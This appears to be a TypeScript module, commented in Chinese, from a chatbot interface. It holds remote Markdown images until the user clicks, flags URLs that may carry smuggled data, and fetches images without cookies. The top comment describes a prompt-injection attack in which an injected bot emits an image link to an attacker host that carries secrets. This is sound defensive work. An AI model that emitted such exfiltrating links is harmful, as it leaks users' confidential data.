/**
 * 對話 Markdown 裡的遠端圖片（issue #764）。bot 會讀外部內容，被 prompt injection 後輸出 `![](https://攻擊者/c?d=機密)`，
 * 瀏覽器一渲染就替它送出去——所以 http(s) 圖片預設不載入，先畫佔位，使用者點了才抓。
 */

export function isRemoteHttpImage(src: string): boolean {
  return /^https?:/i.test(src.trim())
}

/** 參數長到這個長度就警告：正常的圖片網址很少帶這麼長的 query／fragment，夾資料的才會。 */
const SUSPICIOUS_TAIL = 64

export interface RemoteImageInfo {
  host: string
  /** 網址帶帳密、或 query／fragment 很長——可能夾帶資料。 */
  suspicious: boolean
}

export function remoteImageInfo(src: string): RemoteImageInfo | null {
  if (!isRemoteHttpImage(src)) return null
  try {
    const u = new URL(src.trim())
    return { host: u.hostname, suspicious: u.username !== '' || u.password !== '' || u.search.length + u.hash.length > SUSPICIOUS_TAIL }
  } catch {
    return null
  }
}

/** 載入單張遠端圖片的上限，免得一張惡意大檔吃光記憶體。 */
export const REMOTE_IMAGE_MAX_BYTES = 10 * 1024 * 1024

/**
 * 使用者點了「載入圖片」才呼叫。瀏覽器自己 `fetch`→blob：不帶 cookie、不帶 Referer（網址裡可能有 token），
 * 回應要是 `image/*` 且不超過上限；對方沒開 CORS 或抓不到就丟錯，由畫面改成「在新分頁開啟」的連結。
 */
export async function fetchRemoteImageBlob(src: string, fetchImpl: typeof fetch = fetch): Promise<Blob> {
  const res = await fetchImpl(src, { mode: 'cors', credentials: 'omit', referrerPolicy: 'no-referrer', redirect: 'follow' })
  if (!res.ok) throw new Error(`HTTP ${res.status}`)
  const type = res.headers.get('content-type') ?? ''
  if (!/^image\//i.test(type)) throw new Error('不是圖片')
  const blob = await res.blob()
  if (blob.size > REMOTE_IMAGE_MAX_BYTES) throw new Error('圖片太大')
  return blob
}
